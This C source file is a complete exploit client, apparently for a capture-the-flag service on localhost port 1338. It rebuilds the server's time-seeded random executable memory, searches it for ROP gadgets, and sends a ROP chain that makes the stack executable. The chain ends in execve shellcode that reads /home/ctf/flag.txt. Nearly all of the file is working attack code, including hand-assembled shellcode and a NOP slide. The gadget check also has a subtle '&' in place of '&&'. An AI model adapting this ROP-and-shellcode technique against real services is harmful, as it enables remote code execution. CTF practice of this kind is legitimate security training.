#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>

#define INT         0xcd
#define RET         0xc3
#define JMP         0xff
#define ESP_J       0xe4

#define DEC_EBX     0x4b
#define POP_EAX     0x58
#define POP_ECX     0x59
#define POP_EDX     0x5A

#define MOV_EBX     0x89
#define ESP_M       0xe3

// gadget addresses
uint32_t int_80 = 0,
         dec_ebx = 0,
         jmp_esp = 0,
         pop_eax = 0,
         pop_ecx = 0,
         pop_edx = 0,
         mov_ebx = 0;

/*
 * This exploit will run mprotect(STACK_ADDRESS, 4096, PROT_READ|PROT_WRITE|PROT_EXEC)
 * using a ROP chain and then jump into the stack, where the second stage shellcode 
 * will execve "/bin/cat /home/ctf/flag.txt"
 */

uint8_t exploit[4096] = {
    // ROPchain
    0x00, 0x00, 0x00, 0x00, // mov_ebx
    0x00, 0x00, 0x00, 0x00, // dec_ebx
    0x00, 0x00, 0x00, 0x00, // dec_ebx
    0x00, 0x00, 0x00, 0x00, // dec_ebx
    0x00, 0x00, 0x00, 0x00, // dec_ebx
    0x00, 0x00, 0x00, 0x00, // pop_eax
    0x00, 0x00, 0x00, 0x00, // __NR_mprotect
    0x00, 0x00, 0x00, 0x00, // pop_ecx
    0x00, 0x00, 0x00, 0x00, // size
    0x00, 0x00, 0x00, 0x00, // pop_edx
    0x00, 0x00, 0x00, 0x00, // (PROT_READ|PROT_WRITE|PROT_EXEC)
    0x00, 0x00, 0x00, 0x00, // int_80
    0x00, 0x00, 0x00, 0x00, // jmp_esp
    // we slidin
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    0x90, 0x90, 0x90, 0x90, // nop slide
    // second stage shellcode
    0xbc, 0x00, 0x00, 0x38, 0x13,       // mov    esp,0x133800000 ; new stack
    0x6a, 0x0b,                         // push   0xb
    0x58,                               // pop    eax
    0x31, 0xd2,                         // xor    edx,edx
    0x52,                               // push   edx
    0x68, 0x2f, 0x63, 0x61, 0x74,       // push   0x7461632f
    0x68, 0x2f, 0x62, 0x69, 0x6e,       // push   0x6e69622f
    0x89, 0xe3,                         // mov    ebx,esp
    0x68, 0x78, 0x74, 0x00, 0x00,       // push   0x7478
    0x68, 0x61, 0x67, 0x2e, 0x74,       // push   0x742e6761
    0x68, 0x66, 0x2f, 0x66, 0x6c,       // push   0x6c662f66
    0x68, 0x65, 0x2f, 0x63, 0x74,       // push   0x74632f65
    0x68, 0x2f, 0x68, 0x6f, 0x6d,       // push   0x6d6f682f
    0x89, 0xe1,                         // mov    ecx,esp
    0x52,                               // push   edx
    0x51,                               // push   ecx
    0x53,                               // push   ebx
    0x89, 0xe1,                         // mov    ecx,esp
    0xcd, 0x80,                         // int    0x80
    0x6a, 0x01,                         // push   0x01
    0x58,                               // pop    eax
    0x31, 0xdb,                         // xor    ebx, ebx
    0xcd, 0x80,                         // int    0x80
};

#define HOST            "127.0.0.1"
#define PORT            1338

int recv_until(int sock, unsigned char until, int verb)
{
    int rd;
    unsigned char c;

    while (1)
    {
        if ((rd = read(sock, &c, 1)) == 1)
        {
            if (verb) putchar(c);
            if (c == until) return 1;
        } else {
            if (!rd) fprintf(stderr, "EOF received\n");
            else fprintf(stderr, "read: %s\n", strerror(errno));
            return 0;
        }
    }
}

int connect_to_server(void)
{
    int sock;
    struct sockaddr_in targ;

    memset(&targ, 0, sizeof(struct sockaddr));

    targ.sin_port = htons(PORT);
    targ.sin_family = AF_INET;

    if ((sock = socket(targ.sin_family, SOCK_STREAM, 0)) == -1)
    {
        fprintf(stderr, "socket: %s\n", strerror(errno));
        return -1;
    }

    if (inet_pton(AF_INET, HOST, (void*)&targ.sin_addr) != 1)
    {
        fprintf(stderr, "inet_pton fucked up\n");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&targ, sizeof(targ)) == -1)
    {
        fprintf(stderr, "connect: %s\n", strerror(errno));
        return -1;
    }
    printf("=== Connected to %s:%u\n", HOST, PORT);
    return sock;
}

#define CODE_LENGTH     0x500000
#define RANDOM_START    0x13370000
#define GADGET_ADDR(x)  (RANDOM_START+(x))

void check_for_gadgets_3(uint8_t *random, uint32_t offset)
{
    int i = offset ? -2 : 0;
    for (; i < 2; i++) {
    switch(random[i])
    {
    case INT:
        if (int_80) continue;
        if (random[i+1] == 0x80 && random[i+2] == RET) {
            int_80 = GADGET_ADDR(offset+i);
            printf("=!!= Found INT 0x80 gadget @ 0x%08x\n", int_80);
            i++;
        }
        break;
    case MOV_EBX:
        if (mov_ebx) continue;
        if (random[i+1] == ESP_M && random[i+2] == RET) {
            mov_ebx = GADGET_ADDR(offset+i);
            printf("=!!= Found EBX mov gadget @ 0x%08x\n", mov_ebx);
            i++;
        }
        break;

    }
    }
}

void check_for_gadgets_2(uint8_t *random, uint32_t offset)
{
    int i = offset ? -1 : 0;
    for (; i < 3; i++) {
    switch(random[i])
    {
    case POP_EAX:
        if (random[i+1] == RET && !pop_eax) {
            pop_eax = GADGET_ADDR(offset+i);
            printf("=!= Found EAX pop gadget @ 0x%08x\n", pop_eax);
            i++;
        }
        break;

    case POP_ECX:
        if (random[i+1] == RET && !pop_ecx) {
            pop_ecx = GADGET_ADDR(offset+i);
            printf("=!= Found ECX pop gadget @ 0x%08x\n", pop_ecx);
            i++;
        }
        break;

    case POP_EDX:
        if (random[i+1] == RET && !pop_edx) {
            pop_edx = GADGET_ADDR(offset+i);
            printf("=!= Found EDX pop gadget @ 0x%08x\n", pop_edx);
            i++;
        }
        break;

    case DEC_EBX:
        if (random[i+1] == RET && !dec_ebx) {
            dec_ebx = GADGET_ADDR(offset+i);
            printf("=!= Found EBX dec gadget @ 0x%08x\n", dec_ebx);
            i++;
        }
        break;

    case JMP:
        if (random[i+1] == ESP_J && !jmp_esp) {
            jmp_esp = GADGET_ADDR(offset+i);
            printf("=!= Found ESP jmp gadget @ 0x%08x\n", jmp_esp);
            i++;
        }
        break;

    }
    }
}

void *init_random_memory(time_t t)
{
    int i = 0;
    uint32_t *mem = mmap(NULL, CODE_LENGTH, PROT_READ|PROT_WRITE|PROT_EXEC,
            MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    uint8_t *tmp;

    printf("=== Generating random memory with seed %u\n", t);

    srand(t);

    if (mem == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return NULL;
    }

    for (; i < CODE_LENGTH/4; i++) {
        mem[i] = rand();
        check_for_gadgets_2((uint8_t*)(&mem[i]), i*4);
        check_for_gadgets_3((uint8_t*)(&mem[i]), i*4);
    }
    return mem;
}

time_t get_time(int sock)
{
    int i = 0;
    char time_str[1024];
    time_t ret;

    for (; i < 1024; i++) {
        if (read(sock, &time_str[i], 1) != 1) {
            fprintf(stderr, "read: %s\n", strerror(errno));
            return 0;
        }
        if (!isalnum(time_str[i]) || isalpha(time_str[i])) {
            time_str[i] = 0;
            break;
        }
    }

    if (i == 1024) {
        fprintf(stderr, "get_time: invalid input\n");
        return 0;
    }

    if ((ret = strtoul(time_str, NULL, 10)) == ULONG_MAX) {
        fprintf(stderr, "strtoul %s\n", strerror(errno));
        return 0;
    }
    return ret;
}

int main(void)
{
    int sock, ret = 1;
    void *mem = NULL;
    time_t server_time;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    if ((sock = connect_to_server()) == -1) return 1;

    if (!recv_until(sock, ':', 0)) goto fail;
    if (!recv_until(sock, ' ', 0)) goto fail;

    if (!(server_time = get_time(sock))) goto fail;

    if (!recv_until(sock, '.', 0)) goto fail;
    if (!recv_until(sock, '\n', 0)) goto fail;
    if (!recv_until(sock, '\n', 0)) goto fail;

    mem = init_random_memory(server_time);

    if (int_80 && dec_ebx && jmp_esp && pop_ecx 
            && pop_eax && pop_edx & mov_ebx) {
        printf("=!= All gadgets are present! Sending the exploit..\n");

        // Stack layout
        *((uint32_t *)(exploit+0)) = mov_ebx;   // address of mov ebx, esp gadget
        *((uint32_t *)(exploit+4)) = dec_ebx;   // address of dec ebx gadget
        *((uint32_t *)(exploit+8)) = dec_ebx;
        *((uint32_t *)(exploit+12)) = dec_ebx;
        *((uint32_t *)(exploit+16)) = dec_ebx;
        *((uint32_t *)(exploit+20)) = pop_eax;  // address of pop eax gadget
        *((uint32_t *)(exploit+24)) = 125; // __NR_mprotect
        *((uint32_t *)(exploit+28)) = pop_ecx;  // address of pop ecx gadget
        *((uint32_t *)(exploit+32)) = 4096; // page-aligned stack size
        *((uint32_t *)(exploit+36)) = pop_edx;  // address of pop edx gadget
        *((uint32_t *)(exploit+40)) = (PROT_EXEC|PROT_WRITE|PROT_READ);
        *((uint32_t *)(exploit+44)) = int_80;   // address of int 0x80 gadget
        *((uint32_t *)(exploit+48)) = jmp_esp;  // address of jmp esp gadget

        write(sock, exploit, 4096);
        recv_until(sock, '\n', 1);
        ret = 0;
    }
fail:
    close(sock);

    if (mem) munmap(mem, CODE_LENGTH);
    return ret;
}
